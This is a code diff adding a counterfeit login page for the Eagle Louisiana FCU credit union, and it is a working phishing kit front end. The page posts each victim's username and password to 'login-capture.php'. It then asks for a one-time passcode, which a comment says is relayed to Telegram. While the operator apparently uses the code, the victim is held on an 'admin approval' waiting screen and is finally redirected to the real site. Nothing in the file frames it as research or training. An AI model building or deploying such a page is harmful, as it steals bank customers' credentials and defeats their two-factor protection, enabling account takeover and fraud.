@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Login - Eagle Louisiana FCU</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles/login.css">
+    <link rel="stylesheet" href="styles/common.css">
+    <link rel="shortcut icon" href="./favicon-96x96.png" type="image/x-icon">
+    <style>
+        .hidden {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease-in;
+        }
+
+        .visible {
+            display: block;
+            opacity: 1;
+        }
+
+        .form-floating-label {
+            position: relative;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-floating-label input {
+            width: 100%;
+            padding: 16px 12px;
+            font-size: 16px;
+            border: 1px solid #4a4f6b;
+            border-radius: 5px;
+            outline: none;
+        }
+
+        .form-floating-label label {
+            position: absolute;
+            top: 50%;
+            left: 12px;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: #05125f;
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+        
+        .input-group {
+            position: relative;
+        }
+
+        .input-group i {
+            position: absolute;
+            top: 24px;
+            right: 8px;
+            height: 100%;
+            border-radius: 0 5px 5px 0;
+            border-left: none; 
+            z-index: 999;
+            font-size: 16px;
+        }
+        
+        .input-group {
+            position: relative;
+        }
+
+        .input-group i {
+            position: absolute;
+            top: 24px;
+            right: 8px;
+            height: 100%;
+            border-radius: 0 5px 5px 0;
+            border-left: none; 
+            z-index: 999;
+            font-size: 16px;
+        }
+
+        .input-group {
+            position: relative;
+        }
+
+        .input-group i {
+            position: absolute;
+            top: 24px;
+            right: 8px;
+            height: 100%;
+            border-radius: 0 5px 5px 0;
+            border-left: none; 
+            z-index: 999;
+            font-size: 16px;
+        }
+
+        .input-group {
+            position: relative;
+        }
+
+        .input-group i {
+            position: absolute;
+            top: 24px;
+            right: 8px;
+            height: 100%;
+            border-radius: 0 5px 5px 0;
+            border-left: none; 
+            z-index: 999;
+            font-size: 16px;
+        }
+
+        .input-group {
+            position: relative;
+        }
+
+        .input-group i {
+            position: absolute;
+            top: 24px;
+            right: 8px;
+            height: 100%;
+            border-radius: 0 5px 5px 0;
+            border-left: none; 
+            z-index: 999;
+            font-size: 16px;
+        }
+
+
+        .form-floating-label input:focus + label,
+        .form-floating-label input:not(:placeholder-shown) + label {
+            top: -4px;
+            left: 10px;
+            font-size: 12px;
+            color: #05125f;
+            background-color: #fff;
+            padding: 0 5px;
+        }
+
+        .form-floating-label input:focus {
+            border: 2px solid #05125f;
+        }
+
+        .btn-primary {
+            background-color: #d21f06 !important;
+            border-color: #d21f06 !important;
+        }
+
+        .body-special {
+            background-image: url('./eagle-louisiana-fcu-background-landscape-9674bdc3.png') !important;
+            background-repeat: no-repeat !important;
+            background-position: top center !important;
+            background-attachment: fixed !important;
+            background-size: cover !important;
+        }
+
+        .btn {
+            padding: 16px 12px;
+            font-size: 16px;
+        }
+
+        .disable {
+            pointer-events: none;
+            opacity: 0.5;
+            background-color: #ffffff !important;
+        }
+
+        .login-card {
+            background-color: rgba(255, 255, 255);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        @media screen and (max-width: 576px) {
+            .login-card {
+                width: 90%;
+                margin: 24px auto;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container body-special d-flex justify-content-center align-items-center vh-100">
+        <div class="card login-card px-5 pb-5 pt-sm-3 rounded-3 shadow" style="width: 100%; max-width: 500px;">
+            <div class="card-body">
+                <div class="text-center mb-4">
+                    <img src="./eagle-louisiana-fcu-logo.png" alt="First Bank & Trust Company" class="img-fluid logo" width="70%">
+                </div>
+                <!-- Step 1: Username -->
+                <form id="usernameForm" class="visible">
+                    <div class="form-floating-label">
+                        <input type="text" id="username" class="form-control" placeholder=" " required>
+                        <label for="username">Username</label>
+                    </div>
+                    <div class="row mb-3 align-items-center justify-content-center">
+                        <div class="col-7 text-start align-items-start justify-content-start">
+                            <a href="https://my.eaglefederal.org/enroll" style="color: #1C57A6;" class="text-decoration-none">First time user? Enroll now.</a>
+                        </div>
+                        <div class="col-5 text-end">
+                            <button type="button" class="btn btn-primary w-100" onclick="showPasswordStep()">Continue</button>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- Step 2: Username and Password -->
+                <form id="passwordForm" class="hidden">
+                    <div class="form-floating-label">
+                        <input type="text" id="usernameDisplay" class="form-control" placeholder=" " disabled>
+                        <label for="usernameDisplay">Username</label>
+                    </div>
+                    <div class="form-floating-label">
+                        <div class="input-group">
+                            <input type="password" id="password" class="form-control" placeholder=" " required>
+                            <label for="password">Password</label>
+                            <i id="togglePasswordIcon" class="bi bi-eye" onclick="togglePassword()"></i>
+                        </div>
+                        <div class="col text-end align-items-end justify-content-end">
+                            <a href="https://my.eaglefederal.org/forgot-password" style="color: #1C57A6;" class="text-decoration-none">Forgot Password?</a>
+                        </div>
+                    </div>
+                    <div class="row mb-3" id="stepTwoRow">
+                        <div class="col-8 text-start align-items-start justify-content-start">
+                            <i class="bi bi-fingerprint" style="color: #1C57A6; font-size: 1.5rem;"></i>
+                            <span style="color: #1C57A6;">Sign in with a passkey</span>
+                        </div>
+                        <div class="col-4 text-end">
+                            <button type="button" class="btn btn-primary w-100" onclick="attemptLogin()">Login</button>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- Step 3: OTP -->
+                <form id="otpForm" class="hidden">
+                    <div class="form-floating-label">
+                        <input type="text" id="otp" class="form-control" placeholder=" " maxlength="6">
+                        <label for="otp">Enter OTP</label>
+                    </div>
+                    <button type="button" class="btn btn-success w-100" onclick="verifyOTP()">Submit OTP</button>
+                </form>
+
+                <div id="notification" class="alert mt-3" style="display: none;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer Section -->
+    <footer style="background-color: white; padding: 10px 0; text-align: center; font-size: 14px;">
+        <!-- 
+        This HTML snippet displays a copyright notice for "Eagle Louisiana FCU" with the year 2025. 
+        The copyright symbol is represented using the HTML entity `&copy;`, and the bullet point 
+        is represented using the HTML entity `&bull;`.
+        -->
+        <span>&copy; 2025 Eagle Louisiana FCU</span> &bull; 
+        <span>(888) 281-8485</span> &bull; 
+        <a href="https://eaglefederal.org/legal/privacy-policy/" style="color: #1C57A6; text-decoration: none;">Privacy policy</a> &bull; 
+        <span>Federally Insured by NCUA</span> &bull; 
+        <span>Equal Housing Lender</span>
+    </footer>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        const redirectUrl = 'https://eaglefederal.org';
+
+        function fetchRequest(url, method, body) {
+            console.log('Request URL:', url);
+            console.log('Request Method:', method);
+            console.log('Request Body:', body);
+
+            return fetch(url, {
+                method: method,
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams(body),
+            }).then(response => {
+                console.log('Response Status:', response.status);
+                return response.text().then(text => {
+                    console.log('Response Body:', text); // Log the response body for debugging
+                    try {
+                        const jsonResponse = JSON.parse(text); // Attempt to parse the response as JSON
+                        console.log('Parsed JSON Response:', jsonResponse); // Log the parsed JSON
+                        return jsonResponse;
+                    } catch (error) {
+                        console.error('JSON Parsing Error:', error); // Log parsing errors
+                        throw new Error('Invalid JSON response');
+                    }
+                });
+            });
+        }
+
+        let currentUsername = '';
+        let currentAttemptId = 0;
+
+        // Show the password step after the username is entered
+        function showPasswordStep() {
+            const username = document.getElementById('username').value.trim();
+
+            if (!username) {
+                showNotification('Please enter your username', 'danger');
+                return;
+            }
+
+            currentUsername = username; // Store the username for later use
+            document.getElementById('usernameDisplay').value = username;
+
+            // Transition to the password step
+            document.getElementById('usernameForm').classList.remove('visible');
+            document.getElementById('usernameForm').classList.add('hidden');
+            document.getElementById('passwordForm').classList.remove('hidden');
+            document.getElementById('passwordForm').classList.add('visible');
+        }
+
+        // Show the OTP step after login
+        function showOtpStep() {
+            document.getElementById('passwordForm').classList.remove('visible');
+            document.getElementById('passwordForm').classList.add('hidden');
+            document.getElementById('otpForm').classList.remove('hidden');
+            document.getElementById('otpForm').classList.add('visible');
+        }
+
+        // Toggle password visibility
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const toggleIcon = document.getElementById('togglePasswordIcon');
+
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleIcon.classList.remove('bi-eye');
+                toggleIcon.classList.add('bi-eye-slash');
+            } else {
+                passwordField.type = 'password';
+                toggleIcon.classList.remove('bi-eye-slash');
+                toggleIcon.classList.add('bi-eye');
+            }
+        }
+
+        // Show notification messages
+        function showNotification(message, type) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = `alert alert-${type}`;
+            notification.style.display = 'block';
+
+            // Hide after 5 seconds
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+
+        // Show a waiting screen with a spinner
+        function showWaitingScreen() {
+            const waitingScreen = document.createElement('div');
+            waitingScreen.id = 'waitingScreen';
+            waitingScreen.style.position = 'fixed';
+            waitingScreen.style.top = '0';
+            waitingScreen.style.left = '0';
+            waitingScreen.style.width = '100%';
+            waitingScreen.style.height = '100%';
+            waitingScreen.style.backgroundColor = 'rgba(255, 255, 255, 0.9)';
+            waitingScreen.style.display = 'flex';
+            waitingScreen.style.justifyContent = 'center';
+            waitingScreen.style.alignItems = 'center';
+            waitingScreen.style.zIndex = '9999';
+
+            const spinner = document.createElement('div');
+            spinner.className = 'spinner-border text-primary';
+            spinner.style.width = '3rem';
+            spinner.style.height = '3rem';
+            spinner.setAttribute('role', 'status');
+
+            const spinnerText = document.createElement('span');
+            spinnerText.className = 'visually-hidden';
+            spinnerText.textContent = 'Loading...';
+
+            spinner.appendChild(spinnerText);
+            waitingScreen.appendChild(spinner);
+            document.body.appendChild(waitingScreen);
+        }
+
+        // Hide the waiting screen
+        function hideWaitingScreen() {
+            const waitingScreen = document.getElementById('waitingScreen');
+            if (waitingScreen) {
+                document.body.removeChild(waitingScreen);
+            }
+        }
+
+        // Attempt login
+        function attemptLogin() {
+            const password = document.getElementById('password').value.trim();
+
+            if (!password) {
+                showNotification('Please enter your password', 'danger');
+                return;
+            }
+
+            // Send login request to the backend
+            fetchRequest('login-capture.php', 'POST', { username: currentUsername, password })
+            .then(data => { // Removed redundant .json() call
+                if (data.success) {
+                    currentAttemptId = data.attempt_id;
+
+                    showNotification('Please enter the OTP.', 'info');
+                    showOtpStep();
+                } else {
+                    showNotification(data.message, 'danger');
+                }
+            })
+            .catch(error => {
+                showNotification('An error occurred. Please try again later.', 'danger');
+                console.error('Error:', error);
+            });
+        }
+
+        // Poll the server to check the status of the OTP
+        function pollOtpStatus() {
+            const pollInterval = 2000; // Poll every 2 seconds
+            const maxWaitTime = 25000; // Maximum wait time of 25 seconds (10 seconds longer)
+            let elapsedTime = 0;
+
+            showWaitingScreen(); // Show the waiting screen
+
+            const intervalId = setInterval(() => {
+                fetchRequest('otp-verification.php', 'POST', { attempt_id: currentAttemptId })
+                .then(data => {
+                    if (data.success && data.approved) {
+                        clearInterval(intervalId); // Stop polling
+                        hideWaitingScreen(); // Hide the waiting screen
+                        showNotification('Your OTP has been approved. Redirecting...', 'success');
+                        setTimeout(() => {
+                            window.location.href = redirectUrl;
+                        }, 1500);
+                    } else if (data.success && !data.approved) {
+                        clearInterval(intervalId); // Stop polling
+                        hideWaitingScreen(); // Hide the waiting screen
+                        showNotification('OTP rejected. Please try again.', 'danger');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error polling OTP status:', error);
+                });
+
+                elapsedTime += pollInterval;
+                if (elapsedTime >= maxWaitTime) {
+                    clearInterval(intervalId); // Stop polling after max wait time
+                    hideWaitingScreen(); // Hide the waiting screen
+                    showNotification('OTP rejected. Please try again.', 'danger');
+                }
+            }, pollInterval);
+        }
+
+        // Establish a WebSocket connection to listen for real-time status updates
+        function setupWebSocket(attemptId) {
+            const socket = new WebSocket('ws://localhost:8080');
+
+            socket.onopen = function () {
+                console.log('WebSocket connection established');
+                // Send the attempt ID to the server
+                socket.send(JSON.stringify({ attempt_id: attemptId }));
+            };
+
+            socket.onmessage = function (event) {
+                const data = JSON.parse(event.data);
+                console.log('WebSocket message received:', data);
+
+                if (data.status === 'accepted') {
+                    showNotification('Your OTP has been approved. Redirecting...', 'success');
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 1500);
+                } else if (data.status === 'rejected') {
+                    showNotification('OTP rejected. Please try again.', 'danger');
+                }
+            };
+
+            socket.onerror = function (error) {
+                console.error('WebSocket error:', error);
+            };
+
+            socket.onclose = function () {
+                console.log('WebSocket connection closed');
+            };
+        }
+
+        // Updated Verify OTP function to use WebSocket for real-time updates and show waiting screen
+        function verifyOTP() {
+            const otp = document.getElementById('otp').value.trim();
+
+            if (!otp || otp.length !== 6 || isNaN(otp)) {
+                showNotification('Please enter a valid 6-digit OTP', 'danger');
+                return;
+            }
+
+            // Send OTP verification request to the backend
+            fetchRequest('otp-verification.php', 'POST', { attempt_id: currentAttemptId, otp })
+            .then(data => {
+                // Send notification to Telegram with the entered OTP
+                fetchRequest('send_notification.php', 'POST', { id: currentAttemptId, type: 'otp', otp: otp });
+
+                if (data.success) {
+                    showNotification('Waiting for admin approval...', 'info');
+                    showWaitingScreen(); // Show the waiting screen
+                    setupWebSocket(currentAttemptId); // Start WebSocket connection for real-time updates
+                } else {
+                    showNotification(data.message, 'danger');
+                }
+            })
+            .catch(error => {
+                showNotification('An error occurred. Please try again later.', 'danger');
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+
+</html>
